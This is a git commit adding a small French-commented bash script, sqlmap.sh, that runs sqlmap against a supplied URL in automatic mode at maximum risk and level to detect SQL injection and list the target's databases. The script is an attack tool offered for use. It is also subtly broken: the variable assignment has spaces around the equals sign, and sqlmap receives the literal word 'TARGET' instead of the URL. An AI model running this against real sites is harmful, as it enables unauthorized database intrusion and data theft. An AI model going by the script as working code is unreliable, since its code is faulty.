59bf3e8c3798d86f9db2d7b624b2fcd7cc7e5e91
Potite_Bulle <135218431+PotiteBulle@users.noreply.github.com>
2024-09-26 08:27:53 +0200

    SQL Injection avec SQLMap

---
+++ sqlmap.sh
@@ -0,0 +1,19 @@
+#!/bin/bash
+
+# Vérifier si l'URL cible est fournie
+if [ "$#" -ne 1 ]; then
+    echo "Usage : $0 <TARGET_URL>"
+    exit 1
+fi
+
+# URL de la cible vulnérable
+TARGET = "$1"
+
+# Exécuter SQLMAP pour détecter les bases de données vulnérable
+# -u : spécifie l'URL cible
+# --dbs : récupère la liste des bases de données
+# --batch : exécute en mode automatique, sans demande d'interaction
+# --risk=3 : augmente le niveau de risque pour des tests plus complets (ajuster selon les besoins)
+# --level=5 : augmente le niveau de test pour une couverture plus large
+
+sqlmap -u "TARGET" --dbs --batch --risk=3 --level=5
